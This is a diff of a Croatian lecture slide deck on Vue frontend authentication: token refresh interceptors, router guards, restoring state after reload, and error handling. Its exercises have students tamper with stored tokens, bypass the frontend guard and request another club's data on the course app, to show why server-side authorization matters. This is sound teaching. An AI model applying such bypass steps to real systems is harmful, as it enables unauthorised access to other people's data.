+  \item Njegova obnova ne prolazi i korisnik je odjavljen usred rada.
+\end{itemize}
+
+\vspace{0.7em}
+Obnovu zato pokreće samo prvi zahtjev, a ostali čekaju njezin ishod. U kodu je to jedno obećanje koje se pamti dok obnova traje i na koje se ostali zahtjevi vežu.
+\end{frame}
+
+% ------------------------------------------------------------
+\begin{frame}{Stanje nakon osvježavanja stranice}
+Osvježavanje stranice pokreće aplikaciju ispočetka. Sve što je stajalo u memoriji nestaje, uključujući podatke o prijavljenom korisniku.
+
+\vspace{0.7em}
+\begin{itemize}
+  \itemsep0.45em
+  \item Token je u \texttt{localStorage} i dalje ondje, pa korisnik jest prijavljen.
+  \item Pohrana koju dijele prikazi prazna je, pa provjera prije navigacije vidi neprijavljenog korisnika i vodi ga na obrazac za prijavu.
+\end{itemize}
+
+\vspace{0.7em}
+Zato se pri pokretanju, prije prve navigacije, token pročita iz pohrane i pozove \texttt{GET /auth/me}. Uspješan odgovor popunjava podatke o korisniku, a neuspješan briše pohranu i vodi na prijavu.
+\end{frame}
+
+% ------------------------------------------------------------
+\begin{frame}{Vježba: istekli token}
+Prijavljeni ste u aplikaciji i backend je pokrenut.
+
+\vspace{0.8em}
+\begin{enumerate}
+  \itemsep0.4em
+  \item Otvorite alate za razvoj, karticu s pohranom, i pogledajte oba zapisana tokena.
+  \item Zamijenite nekoliko znakova u \texttt{access\_token} i otvorite prikaz koji dohvaća podatke.
+  \item U kartici Mreža izbrojite koliko je zahtjeva poslano i kojim je redom.
+  \item Zamijenite nekoliko znakova i u \texttt{refresh\_token} i ponovite drugi korak.
+\end{enumerate}
+
+\vspace{0.8em}
+Što se u trećem koraku dogodilo s izvornim zahtjevom i u kojem je koraku korisnik odjavljen?
+\end{frame}
+
+% ============================================================
+\sekcija{Zaštita prikaza i pogreške}{Provjera prije navigacije, podatci uz rutu, granica između sučelja i poslužitelja, obrada pogrešaka na jednom mjestu.}
+
+% ------------------------------------------------------------
+\begin{frame}{Prikaz koji se ne smije otvoriti}
+Neprijavljeni korisnik koji upiše adresu zaštićenog prikaza dobiva stranicu. Prikaz se iscrta, zatraži podatke i dobije \texttt{401}, pa ostane prazan uz poruku o pogrešci.
+
+\vspace{0.9em}
+Podatci nisu izišli, jer ih je poslužitelj odbio. Korisnik je ipak dobio prazan zaslon umjesto obrasca za prijavu.
+
+\vspace{0.9em}
+Isto vrijedi i za klub koji otvori administratorski prikaz: svaki zahtjev s te stranice vraća \texttt{403}, a korisnik ne zna zašto.
+\end{frame}
+
+% ------------------------------------------------------------
+\begin{frame}[fragile]{Provjera prije navigacije}
+Vue Router prije svake promjene adrese poziva funkciju koja smije navigaciju preusmjeriti:
+
+\begin{lstlisting}[language=typescript]
+router.beforeEach((to) => {
   const auth = useAuthStore()
-
-  // Javne rute - ne trebaju auth
   if (to.name === 'login') return true
-
-  // Nije prijavljen - redirect na login
-  if (!auth.isAuthenticated) {
-    return { name: 'login' }
+  if (!auth.prijavljen) return { name: 'login' }
+  if (to.meta.samoOrganizator && !auth.organizator) {
+    return { name: 'pocetna' }
   }
-
-  // Admin rute - provjera role
-  if (to.meta.requiresAdmin && !auth.isAdmin) {
-    return { name: 'dashboard' }
-  }
-
   return true
 })
 \end{lstlisting}
 
 \vspace{0.4em}
-\texttt{beforeEach} se poziva prije svake navigacije. Ako vrati objekt s \texttt{name}, korisnik je preusmjeren.
+Vrati li funkcija \texttt{true}, navigacija se nastavlja. Vrati li opis rute, korisnik odlazi na nju.
 \end{frame}
 
 % ------------------------------------------------------------
-\begin{frame}[fragile,shrink=5]{Meta polja na rutama}
-\begin{lstlisting}[language=typescript]
-const routes = [
-  { path: '/login', name: 'login', component: LoginView },
-  {
-    path: '/',
-    name: 'dashboard',
-    component: DashboardView,
-    // nema meta - samo treba auth (guard provjerava)
-  },
-  {
-    path: '/admin',
-    component: AdminLayout,
-    meta: { requiresAdmin: true },
-    children: [
-      { path: 'clubs', component: AdminClubsView },
-      { path: 'competitions', component: AdminCompetitionsView },
-    ],
-  },
-]
-\end{lstlisting}
-
-\vspace{0.4em}
-\texttt{meta} polja su custom podaci na ruti. Guard ih čita i odlučuje smije li korisnik pristupiti.
-\end{frame}
-
-% ------------------------------------------------------------
-\begin{frame}{Navigation guards: tipovi}
-Vue Router ima tri razine navigation guardova:
-
-\vspace{0.4em}
-\begin{tabular}{@{}lp{4cm}p{5cm}@{}}
-  \toprule
-  \textbf{Tip} & \textbf{Gdje se definira} & \textbf{Kad koristiti} \\
-  \midrule
-  Global & \texttt{router.beforeEach()} & Auth provjera za cijelu aplikaciju \\
-  Per-route & \texttt{beforeEnter} na ruti & Specifična pravila za jednu rutu \\
-  In-component & \texttt{onBeforeRouteLeave()} & \enquote{Imate nespremljene promjene} dijalog \\
-  \bottomrule
-\end{tabular}
-
-\vspace{0.6em}
-Mi koristimo globalni guard za auth jer svaka ruta osim logina zahtijeva prijavu. Per-route guard bismo koristili za npr. admin-only stranicu s posebnom logikom.
-\end{frame}
-
-% ------------------------------------------------------------
-\begin{frame}{Frontend guard vs backend zaštita}
-Frontend guard je \textbf{UX poboljšanje}, ne sigurnosna zaštita.
-
-\vspace{0.6em}
-\begin{columns}[T]
-\column{0.48\textwidth}
-\textbf{Frontend guard}
-\begin{itemize}
-  \item Sprečava navigaciju na zabranjenu rutu
-  \item Korisnik ne vidi stranicu
-  \item Može se zaobići (DevTools, direktan API poziv)
-  \item Služi za bolji UX
-\end{itemize}
-
-\column{0.48\textwidth}
-\textbf{Backend zaštita}
-\begin{itemize}
-  \item Provjerava token na svakom requestu
-  \item Vraća 401/403 ako nema pristupa
-  \item Ne može se zaobići
-  \item Autoritet za sigurnost
-\end{itemize}
-\end{columns}
-
-\vspace{0.6em}
-Oboje su potrebni. Frontend guard sprečava konfuziju, backend sprečava zloupotrebu.
-\end{frame}
-
-% ------------------------------------------------------------
-\begin{frame}{Auth stanje pri refreshu stranice}
-Problem: kad korisnik refresha stranicu, Pinia store se resetira na početne vrijednosti.
-
-\vspace{0.6em}
-\begin{enumerate}
-  \item Korisnik refresha stranicu $\rightarrow$ Pinia state = prazan
-  \item Guard vidi \texttt{isAuthenticated = false} $\rightarrow$ redirect na login
-  \item Ali token još postoji u localStorage!
-\end{enumerate}
-
-\vspace{0.6em}
-Rješenje: pri startu aplikacije provjerimo localStorage i pozovemo \texttt{/auth/me}:
-\begin{enumerate}
-  \item Čitamo token iz localStorage
-  \item Ako postoji - pozovemo \texttt{GET /auth/me}
-  \item Ako uspije - popunimo store s user podacima
-  \item Ako ne uspije (token istekao) - brišemo localStorage, redirect na login
-\end{enumerate}
-\end{frame}
-
-% ------------------------------------------------------------
-\begin{frame}[fragile,shrink=5]{401 interceptor: automatski refresh}
-\begin{lstlisting}[language=typescript]
-// src/api/client.ts
-api.interceptors.response.use(
-  (response) => response,
-  async (error: AxiosError) => {
-    const original = error.config as
-      InternalAxiosRequestConfig & { _retry?: boolean }
-    if (error.response?.status === 401 && !original._retry) {
-      original._retry = true
-      try {
-        const refresh = localStorage.getItem('refresh_token')
-        const { data } = await axios.post(
-          `${original.baseURL}/auth/refresh`,
-          { refresh_token: refresh },
-        )
-        localStorage.setItem('access_token', data.access_token)
-        localStorage.setItem('refresh_token', data.refresh_token)
-        original.headers.Authorization =
-          `Bearer ${data.access_token}`
-        return api(original)
-      } catch {
-        // refresh failed - logout
-        localStorage.clear()
-        window.location.href = '/login'
-      }
-    }
-    return Promise.reject(error)
-  }
-)
-\end{lstlisting}
-\end{frame}
-
-% ------------------------------------------------------------
-\begin{frame}{Kako radi 401 interceptor}
-\begin{enumerate}
-  \item Korisnik radi request s isteklim access tokenom
-  \item Backend vraća \textbf{401 Unauthorized}
-  \item Interceptor hvata 401, šalje refresh token na \codefile{/auth/refresh}
-  \item Ako refresh uspije - sprema nove tokene, ponavlja originalni request
-  \item Ako refresh ne uspije (refresh token istekao) - logout i redirect na login
-\end{enumerate}
-
-\vspace{0.6em}
-Korisnik ne primjećuje refresh - request se automatski ponovi s novim tokenom. Jedino ako je i refresh token istekao, korisnik mora ponovo upisati lozinku.
-\end{frame}
-
-% ------------------------------------------------------------
-\begin{frame}[fragile,shrink=5]{Globalni error handling}
-\begin{lstlisting}[language=typescript]
-// src/api/client.ts - dodajemo u response interceptor
-
-// Za sve ostale greske (ne-401)
-api.interceptors.response.use(
-  (response) => response,
-  (error: AxiosError<{ message?: string }>) => {
-    const status = error.response?.status
-    const data = error.response?.data
-
-    if (status === 403) {
-      console.error('Nemate pristup:', data?.message)
-    } else if (status === 422) {
-      console.error('Validacijska greska:', data)
-    } else if (status >= 500) {
-      console.error('Server error:', status)
-    }
-
-    return Promise.reject(error)
-  }
-)
-\end{lstlisting}
-
-\vspace{0.4em}
-Centralizirani error handling - ne trebamo \texttt{try/catch} za iste scenarije u svakoj komponenti.
-\end{frame}
-
-% ------------------------------------------------------------
-\begin{frame}[fragile,shrink=5]{Vue errorHandler: protiv bijelog ekrana}
-Interceptor hvata HTTP greške, ali ne i greške u samim komponentama - exception u renderu ruši SPA u prazan ekran. Zadnja linija obrane:
+\begin{frame}[fragile]{Podatci uz rutu}
+Uvjet se ne piše u provjeru, nego uz rutu na koju se odnosi:
 
 \begin{lstlisting}[language=typescript]
-// src/main.ts
-const app = createApp(App)
-
-app.config.errorHandler = (err, instance, info) => {
-  console.error('Vue error:', err, info)
-  // u produkciji: posalji u error tracking (Sentry)
-  // i prikazi korisniku genericku poruku
+{
+  path: '/admin',
+  component: AdminLayout,
+  meta: { samoOrganizator: true },
+  children: [
+    { path: 'clubs', component: AdminClubsView },
+  ],
 }
 \end{lstlisting}
 
 \vspace{0.4em}
-\texttt{errorHandler} hvata sve neuhvaćene greške iz komponenti, computeda i watchera. Korisnik umjesto bijelog ekrana dobiva poruku, a vi u konzoli ili error trackingu vidite što je puklo. Isti \enquote{fail gracefully} princip koji backend već ima kroz exception handler.
+Polje \texttt{meta} nosi proizvoljne podatke o ruti i nasljeđuje se na djecu. Provjera time ostaje jedna, a popis zaštićenih prikaza stoji ondje gdje se prikazi i nabrajaju.
 \end{frame}
 
 % ------------------------------------------------------------
-\begin{frame}{Auth flow: login}
-\begin{enumerate}
-  \item Korisnik otvori aplikaciju $\rightarrow$ guard provjeri token
-  \item Nema tokena $\rightarrow$ redirect na \codefile{/login}
-  \item Korisnik unese credentials $\rightarrow$ POST \codefile{/auth/login}
-  \item Backend vrati access + refresh token $\rightarrow$ spremimo u localStorage
-  \item Pozovemo \codefile{/auth/me} $\rightarrow$ spremimo user objekt u store
-  \item \texttt{router.replace('/')} $\rightarrow$ korisnik vidi dashboard
-\end{enumerate}
-\end{frame}
+\begin{frame}{Sučelje nije zaštita}
+Provjera prije navigacije sprječava da korisnik otvori prikaz koji mu ne pripada. Ne sprječava ga da pošalje zahtjev.
 
-% ------------------------------------------------------------
-\begin{frame}{Auth flow: token lifecycle}
-\begin{enumerate}
-  \item Svaki request ide s \texttt{Authorization: Bearer <token>}
-  \item Token istekne $\rightarrow$ 401 $\rightarrow$ interceptor radi refresh
-  \item Refresh istekne $\rightarrow$ logout $\rightarrow$ natrag na login
-\end{enumerate}
-
-\vspace{0.6em}
-Korisnik ne primjećuje refresh - cijeli ciklus se odvija automatski u interceptoru.
-\end{frame}
-
-% ------------------------------------------------------------
-\begin{frame}{Race condition pri refreshu tokena}
-Što ako dva API poziva istovremeno dobiju 401?
-
-\vspace{0.4em}
-\begin{enumerate}
-  \item Request A dobije 401 $\rightarrow$ šalje refresh
-  \item Request B dobije 401 $\rightarrow$ također šalje refresh
-  \item Refresh za A uspije - novi token
-  \item Refresh za B koristi stari refresh token koji je već iskorišten $\rightarrow$ fail
-  \item Korisnik je izbačen bez razloga
-\end{enumerate}
-
-\vspace{0.6em}
-Rješenje: koristiti \textbf{queue pattern} - prvi 401 pokrene refresh, svi ostali čekaju rezultat tog refresha. Naš interceptor koristi \texttt{\_retry} flag kao jednostavnu verziju ovog patterna.
-\end{frame}
-
-% ------------------------------------------------------------
-\begin{frame}{Centralizirani vs distribuirani error handling}
-\begin{columns}[T]
-\column{0.48\textwidth}
-\textbf{Centralizirani (interceptor)}
+\vspace{0.7em}
 \begin{itemize}
-  \item 401: automatski refresh
-  \item 403: \enquote{Nemate pristup}
-  \item 500: \enquote{Server error}
-  \item Isti handling za sve requestove
+  \itemsep0.45em
+  \item Zahtjev se može poslati iz konzole preglednika, iz alata ili iz tuđeg programa.
+  \item Vrijednost u pohrani preglednika korisnik može promijeniti sam.
+  \item Preuzeti kod aplikacije sadrži sve adrese koje ona poziva.
 \end{itemize}
 
-\column{0.48\textwidth}
-\textbf{Distribuirani (try/catch)}
-\begin{itemize}
-  \item 409: \enquote{Natjecatelj je već prijavljen}
-  \item 422: prikaz field-level grešaka
-  \item Specifičan za kontekst
-\end{itemize}
-\end{columns}
-
-\vspace{0.6em}
-Koristimo oba. Interceptor hendla generičke greške automatski. Komponenta hendla specifične greške koje zahtijevaju kontekstualan prikaz.
+\vspace{0.7em}
+Zato provjera u sučelju postoji radi korisnika, a provjera na poslužitelju radi zaštite. \textbf{Podatci koji korisniku ne pripadaju ne izlaze iz poslužitelja}, bez obzira na to što sučelje prikazuje.
 \end{frame}
 
 % ------------------------------------------------------------
-\begin{frame}{Testiranje auth flowa u DevTools}
-\begin{tabular}{@{}lp{8cm}@{}}
+\begin{frame}{Gdje se pogreška obrađuje}
+\vspace{0.3em}
+\begin{center}
+{\small
+\setlength{\tabcolsep}{6pt}
+\renewcommand{\arraystretch}{1.25}
+\begin{tabular}{@{}L{2.0cm}L{4.4cm}L{4.9cm}@{}}
   \toprule
-  \textbf{DevTools tab} & \textbf{Što provjeravamo} \\
+  \textbf{Kod} & \textbf{Značenje} & \textbf{Tko ga obrađuje} \\
   \midrule
-  Network & Jesu li requestovi poslani s \texttt{Authorization} headerom? Koji status code smo dobili? \\
-  Application > Local Storage & Postoje li \texttt{access\_token} i \texttt{refresh\_token}? Jesu li ažurirani nakon refresha? \\
-  Console & Ima li grešaka? Jesu li interceptori logirali nešto? \\
-  Vue DevTools > Pinia & Je li auth store ažuriran? Ima li user objekt? \\
+  \texttt{401} & token ne vrijedi ili je istekao & presretač: obnova ili odjava \\
+  \texttt{403} & uloga ili vlasništvo ne dopuštaju & presretač: poruka i povratak \\
+  \texttt{422} & tijelo ne odgovara shemi & prikaz: poruka uz polje \\
+  \texttt{409} & radnja je u sukobu sa stanjem & prikaz: poruka iznad obrasca \\
   \bottomrule
 \end{tabular}
+}
+\end{center}
 
 \vspace{0.6em}
-Za testiranje refresh flowa: otvorite Application tab, ručno obrišite \texttt{access\_token}, napravite bilo koji API poziv. Interceptor bi trebao automatski refreshati token.
-\end{frame}
-
-% ------------------------------------------------------------
-\begin{frame}{Commitovi za Predavanje 8}
-\begin{itemize}
-  \item \texttt{feat(web): add API client wrapper with base URL and interceptors}
-  \item \texttt{feat(web): implement auth store (Pinia) and login page}
-  \item \texttt{feat(web): add route guards for role-based access (admin/club)}
-  \item \texttt{feat(web): implement token refresh flow and 401 handling}
-  \item \texttt{fix(web): add global error handling and toast/alert pattern}
-\end{itemize}
+Prva dva odgovora svugdje znače isto, pa se obrađuju na jednom mjestu. Druga dva ovise o tome koji je obrazac poslan, pa ih obrađuje prikaz koji ga je poslao.
 
 \vspace{0.4em}
-\textbf{Na satu:} implementiramo auth od nule, testiramo login/refresh u browseru, provjeravamo guardove.
+Odgovor nosi i polje \texttt{code}, koje je stalno. Sučelje grana obradu po njemu.
 \end{frame}
 
 % ------------------------------------------------------------
-\begin{frame}{Što ide sljedeće (Predavanje 9)}
-\begin{itemize}
-  \item State management s Piniom za poslovne entitete
-  \item CRUD viewovi: lista, forma, detalji
-  \item Loading, error i empty stanja
-  \item Forme s validacijom
-\end{itemize}
+\begin{frame}[fragile]{Pogreška u samom prikazu}
+Presretač hvata pogreške koje stignu kao odgovor. Iznimka u kodu komponente ne prolazi kroz njega: prikaz se prekine i korisnik ostane pred praznim zaslonom.
+
+\begin{lstlisting}[language=typescript]
+// main.ts
+app.config.errorHandler = (err, instance, info) => {
+  console.error(err, info)
+}
+\end{lstlisting}
+
+\vspace{0.4em}
+Rukovatelj hvata neuhvaćene iznimke iz komponenata, izvedenih vrijednosti i promatrača. Isto mjesto služi i za poruku korisniku umjesto praznog zaslona.
+
+\vspace{0.4em}
+Uloga mu odgovara onoj koju na poslužitelju ima rukovatelj koji iznimku prevodi u odgovor.
+\end{frame}
+
+% ------------------------------------------------------------
+\begin{frame}{Vježba: zaobilaženje zaštite sučelja}
+Prijavite se kao klub \texttt{behemot@plreg.hr}. Administratorski prikaz vama nije dostupan.
 
 \vspace{0.8em}
-\begin{center}
-\Large Pitanja?
-\end{center}
+\begin{enumerate}
+  \itemsep0.4em
+  \item Upišite adresu administratorskog prikaza izravno u traku preglednika.
+  \item U konzoli pošaljite \texttt{POST /clubs} s ispravnim tijelom i svojim tokenom.
+  \item Dohvatite popis natjecatelja drugoga kluba, s oznakom koja nije vaša.
+  \item U pohrani preglednika pronađite zapis koji sučelje čita i promijenite ga tako da sučelje misli da ste organizator.
+  \item Ponovite drugi korak.
+\end{enumerate}
+
+\vspace{0.8em}
+Koji ste status dobili u drugom koraku, a koji nakon četvrtoga, i što se u aplikaciji promijenilo?
+\end{frame}
+
+% ------------------------------------------------------------
+\begin{frame}{Sažetak}
+\begin{itemize}
+  \itemsep0.3em
+  \item Odgovor s drugog izvora preglednik daje skripti samo uz dopuštenje poslužitelja.
+  \item Dopuštenje se zapisuje na poslužitelju i navodi izvore izrijekom.
+  \item Zahtjev sa zaglavljem ili tijelom dobiva predzahtjev metodom \texttt{OPTIONS}.
+  \item Adresa, zaglavlja i obrada statusa opisuju se jednom, u zajedničkom klijentu.
+  \item Prijava vraća kratkotrajni token za zahtjeve i dugotrajni za obnovu.
+  \item Obje pohrane u pregledniku skripta čita; razlika je koliko dugo.
+  \item Token dodaje presretač zahtjeva, a obnavlja ga presretač odgovora.
+  \item Osvježavanje prazni memoriju, pa se korisnik dohvaća pri pokretanju.
+  \item Provjera prije navigacije postoji radi korisnika, a ne kao zaštita.
+  \item \texttt{401} i \texttt{403} idu na jedno mjesto, \texttt{422} i \texttt{409} u prikaz.
+\end{itemize}
 \end{frame}
 
 \end{document}
